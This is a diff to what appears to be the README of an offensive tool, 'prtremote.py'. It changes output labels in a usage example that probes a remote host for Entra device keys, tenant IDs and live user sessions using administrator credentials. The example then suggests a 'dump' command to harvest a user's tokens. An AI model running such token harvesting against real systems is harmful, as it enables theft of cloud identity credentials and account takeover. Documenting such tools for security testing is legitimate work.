@@ -28,11 +28,11 @@ python prtremote.py check 'ENDPOINT/Administrator:Passw0rd!@192.168.122.64'
 [*] Connecting to 192.168.122.64 (192.168.122.64)
 
 [*] Target ............... 192.168.122.64
-[*] Entra registered ..... YES
+[*] Device Entra-joined .. YES
 [*]   Device key(s) ...... 4c1f8a2b-...
 [*]   Tenant ID(s) ....... 8b1c9d0e-...
 [*] Live sessions ........ 1
-[*]   achen .............. S-1-12-1-1234567890-...
+[*]   achen (Entra cloud SID) . S-1-12-1-1234567890-...
 
 [*] Harvest with: prtremote.py dump ENDPOINT/Administrator:Passw0rd!@192.168.122.64 -run-user achen
 ```
